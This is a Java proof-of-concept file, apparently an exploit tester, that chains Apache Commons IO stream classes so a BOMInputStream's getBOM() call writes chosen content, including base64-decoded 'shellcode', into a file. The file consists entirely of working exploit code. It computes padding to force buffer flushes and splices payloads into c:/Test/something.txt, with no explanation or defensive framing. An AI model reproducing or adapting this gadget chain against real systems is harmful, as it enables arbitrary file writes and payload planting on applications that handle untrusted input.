import org.apache.commons.codec.binary.Base64InputStream;
import org.apache.commons.io.ByteOrderMark;
import org.apache.commons.io.input.BOMInputStream;
import org.apache.commons.io.input.CharSequenceInputStream;
import org.apache.commons.io.input.TeeInputStream;
import org.apache.commons.io.output.FileWriterWithEncoding;
import org.apache.commons.io.output.WriterOutputStream;

import java.io.*;

public class WriteExploitTester {
    private static final int bufferSize = 8192;

    public static void replaceWithShellcode(String input) throws IOException {
        int autoflushPaddingSize = bufferSize - input.length() % bufferSize + 1;
        input += "x".repeat(autoflushPaddingSize);
        InputStream inputStream = new CharSequenceInputStream(input, "UTF-8");

        Writer writer = new FileWriterWithEncoding("c:/Test/something.txt", "UTF-8");
        OutputStream outputStream = new WriterOutputStream(writer, "UTF-8", 8192, true);

        InputStream delegate = new TeeInputStream(inputStream, outputStream);

        BOMInputStream bomInputStream = new BOMInputStream(delegate, new ByteOrderMark("myBom", new int[input.length()]));

        bomInputStream.getBOM();
    }

    public static void injectShellcode(String shellcode, int pre_chars, int post_chars) throws IOException {
        int totalSize = shellcode.length() + pre_chars + post_chars;
        int autoflushPaddingSize = bufferSize - totalSize % bufferSize + 1;
        String autoflushPadding = "\n".repeat(autoflushPaddingSize);

        InputStream inputStream1 = new FileInputStream("c:/Test/something.txt");
        InputStream inputStream2 = new CharSequenceInputStream(shellcode, "UTF-8");
        InputStream inputStream4 = new CharSequenceInputStream(autoflushPadding, "UTF-8");

        Writer writer = new FileWriterWithEncoding("c:/Test/something.txt", "UTF-8");
        OutputStream outputStream = new WriterOutputStream(writer, "UTF-8", 8192, true);

        InputStream delegate1 = new TeeInputStream(inputStream1, outputStream);
        InputStream delegate2 = new TeeInputStream(inputStream2, outputStream);
        InputStream delegate3 = delegate1;
        InputStream delegate4 = new TeeInputStream(inputStream4, outputStream);

        BOMInputStream bomInputStream1 = new BOMInputStream(delegate1, new ByteOrderMark("myBom", new int[pre_chars]));
        BOMInputStream bomInputStream2 = new BOMInputStream(delegate2, new ByteOrderMark("myBom", new int[shellcode.length()]));
        BOMInputStream bomInputStream3 = new BOMInputStream(delegate3, new ByteOrderMark("myBom", new int[post_chars]));
        BOMInputStream bomInputStream4 = new BOMInputStream(delegate4, new ByteOrderMark("myBom", new int[autoflushPaddingSize]));

        bomInputStream1.getBOM();
        bomInputStream2.getBOM();
        bomInputStream3.getBOM();
        bomInputStream4.getBOM();
    }

    public static void replaceWithShellcodeBytes(String b64Shellcode) throws IOException {
        InputStream inputStream = new CharSequenceInputStream(b64Shellcode, "UTF-8");
        InputStream b64InputStream = new Base64InputStream(inputStream);

        OutputStream outputStream = new FileOutputStream("c:/Test/something.txt");

        InputStream delegate = new TeeInputStream(b64InputStream, outputStream);

        BOMInputStream bomInputStream = new BOMInputStream(delegate, new ByteOrderMark("myBom",  new int[b64Shellcode.length() + 1]));

        bomInputStream.getBOM();
    }
}
